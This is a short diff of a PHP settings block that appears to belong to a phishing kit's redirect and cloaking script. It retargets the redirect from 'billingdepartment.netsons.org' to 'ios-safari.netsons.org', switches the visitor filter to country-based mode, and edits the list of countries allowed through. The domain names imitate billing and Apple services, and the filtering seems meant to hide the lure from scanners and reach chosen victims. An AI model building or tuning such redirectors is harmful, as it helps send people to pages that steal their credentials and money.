@@ -57,13 +57,13 @@ if (isset($_GET["check"]))
 
 $license = "Houss-1987";
 
-$redirect = "https://billingdepartment.netsons.org/";
+$redirect = "https://ios-safari.netsons.org/";
 
-$parameter = 4; // 1 => Both , 2 => Country , 3 => Proxy , 4 => Simple
+$parameter = 2; // 1 => Both , 2 => Country , 3 => Proxy , 4 => Simple
 $wordpress = true; // Allow Wordpress Include
 $checkfileup = false; // Check Link UP
 
-$country = array("ma","it"); #Country's Allowed To Access
+$country = array("ma","ca"); #Country's Allowed To Access
 
 /************************************************************* PARAMETRES ******************************************************************/
 
